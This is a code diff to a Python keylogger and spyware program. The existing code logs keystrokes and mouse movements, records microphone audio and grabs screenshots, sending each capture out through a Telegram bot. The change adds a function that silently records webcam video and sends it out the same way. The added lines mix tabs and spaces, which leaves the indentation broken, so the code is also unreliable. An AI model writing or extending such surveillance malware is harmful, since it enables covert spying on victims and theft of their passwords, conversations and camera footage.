@@ -8,6 +8,7 @@ import pyscreenshot
 import sounddevice as sd
 import cv2
 import telebot
+import time
 
 from pynput import keyboard
 from pynput.keyboard import Listener
@@ -27,7 +28,7 @@ def send_data(message):
 
         def appendlog(self, string):
             self.log = self.log + string
-        
+
         def on_move(self, x, y):
             current_move = logging.info("Mouse moved to {} {}".format(x, y))
             self.appendlog(current_move)
@@ -52,7 +53,7 @@ def send_data(message):
                     current_key = " " + str(key) + " "
 
             self.appendlog(current_key)
-        
+
         def send_message(self, thing):
             bot.reply_to(message, thing)
 
@@ -84,12 +85,29 @@ def send_data(message):
             myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
             obj.writeframesraw(myrecording)
             sd.wait()
-
-            self.send_message(thing=obj)
+			self.send_message(thing=obj)
 
         def screenshot(self):
             img = pyscreenshot.grab()
             self.send_message(thing=img)
+
+		def record(self):
+			capture_duration = 10
+			cap = cv2.VideoCapture(0)
+			fourcc = cv2.VideoWriter_fourcc(*'XVID')
+			out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
+			start_time = time.time()
+		    	while( int(time.time() - start_time) < capture_duration ):
+    				ret, frame = cap.read()
+    				if ret==True:
+        				frame = cv2.flip(frame,0)
+        				out.write(frame)
+    				else:
+        				break
+			cap.release()
+			out.release()
+			cv2.destroyAllWindows()
+			self.send_message(thing='output.avi')
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
